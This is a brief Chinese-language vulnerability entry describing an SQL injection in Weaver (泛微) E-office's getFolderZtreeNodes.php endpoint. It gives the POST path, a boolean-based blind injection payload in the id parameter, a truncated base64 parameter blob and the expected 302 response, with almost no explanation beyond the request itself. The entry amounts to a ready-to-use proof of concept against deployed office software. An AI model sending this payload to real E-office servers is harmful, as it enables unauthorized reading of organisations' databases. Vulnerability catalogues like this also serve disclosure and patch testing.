# 泛微E-officegetFolderZtreeNodes.php存在SQL注入漏洞

- **系统**：泛微OA　|　**类型**：SQL注入　|　**CVE**：—
- **请求**：`POST /general/system/file_folder/purview_new/getFolderZtreeNodes.php HTTP/1.1`

**请求体 / payload**
```
id=(SELECT (CASE WHEN (length(database())>0) THEN 1 ELSE (SELECT 9469 UNION SELECT 1668) END))&lv=0&n=&param=eyJmaWxlU29ydCI6bnVsbCwicm9vdCI6eyJuYW1lIjpudWxsLCJjaGVjayI6dHJ1ZSwidXJsIjoiL2dlbmVyYWwvZmlsZV9mb2xkZXIvZmlsZV9uZXcvZmlsZWxpc3QucGhwP1NPUlRfSUQ9MCZGSUxFX1NPUlQ9IiwidGFyZ2V0IjoiZmlsZV9tYWluIiwicmlnaHRDbGljayI6ZmFsc2V9LCJub2RlIjp7InJpZ2h0Q2xpY2siOmZhbHNlLCJ1cmwiOiIvZ2VuZXJhbC9maWxlX2ZvbGRlci9maWxlX25ldy9maWxlbGlzdC5waHAiLCJ0YXJnZXQiOiJmaWxlX21haW4iLCJsb2FkQWxsIjpmYWxzZX0sInNlbGVjdCI6eyJzb3J0aWQiOm51bGwsInNvcnRuYW1lIjpudWxsLCJnZXR3aGF0IjpudWxsLCJmaWxlc29ydCI6bnVsbCwiY2xpY2tGdW4iOiJzZWxlY3R…（脚本共 613 字，完整版见原文）
```
- **预期**：302　|　folder.class.php